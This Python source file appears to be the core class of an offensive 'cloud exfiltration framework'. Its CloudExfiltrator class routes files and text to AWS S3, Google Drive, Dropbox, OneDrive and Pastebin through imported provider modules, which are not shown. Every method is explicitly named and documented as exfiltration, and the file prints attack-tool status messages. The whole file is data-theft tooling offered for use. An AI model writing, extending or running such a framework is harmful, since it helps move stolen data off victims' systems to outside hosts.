#!/usr/bin/env python3
"""
Core cloud exfiltration class
"""

from .aws_s3 import S3Provider
from .google_drive import GoogleDriveProvider
from .dropbox import DropboxProvider
from .onedrive import OneDriveProvider
from .pastebin import PastebinProvider

class CloudExfiltrator:
    """Main interface for cloud exfiltration"""
    
    def __init__(self):
        """Initialize cloud exfiltration"""
        self.providers = {
            's3': S3Provider(),
            'gdrive': GoogleDriveProvider(),
            'dropbox': DropboxProvider(),
            'onedrive': OneDriveProvider(),
            'pastebin': PastebinProvider()
        }
        
        print("[+] Cloud exfiltration framework initialized")
        print(f"[+] Available providers: {', '.join(self.providers.keys())}")
    
    def exfil_to_s3(self, filepath, bucket_name, aws_access_key, aws_secret_key, 
                    object_name=None, region='us-east-1'):
        """Exfiltrate file to AWS S3"""
        return self.providers['s3'].upload_file(
            filepath, bucket_name, aws_access_key, 
            aws_secret_key, object_name, region
        )
    
    def exfil_to_google_drive(self, filepath, credentials_file, folder_id=None):
        """Exfiltrate file to Google Drive"""
        return self.providers['gdrive'].upload_file(filepath, credentials_file, folder_id)
    
    def exfil_to_dropbox(self, filepath, access_token, dest_path=None):
        """Exfiltrate file to Dropbox"""
        return self.providers['dropbox'].upload_file(filepath, access_token, dest_path)
    
    def exfil_to_onedrive(self, filepath, access_token, dest_folder=None):
        """Exfiltrate file to OneDrive"""
        return self.providers['onedrive'].upload_file(filepath, access_token, dest_folder)
    
    def exfil_via_pastebin(self, data_or_filepath, api_key=None, is_file=False):
        """Exfiltrate small data via Pastebin"""
        if is_file:
            return self.providers['pastebin'].upload_file(data_or_filepath, api_key)
        else:
            return self.providers['pastebin'].upload_text(data_or_filepath, api_key)
    
    def get_provider(self, provider_name):
        """Get specific provider instance"""
        return self.providers.get(provider_name)
    
    def list_providers(self):
        """List all available providers"""
        return list(self.providers.keys())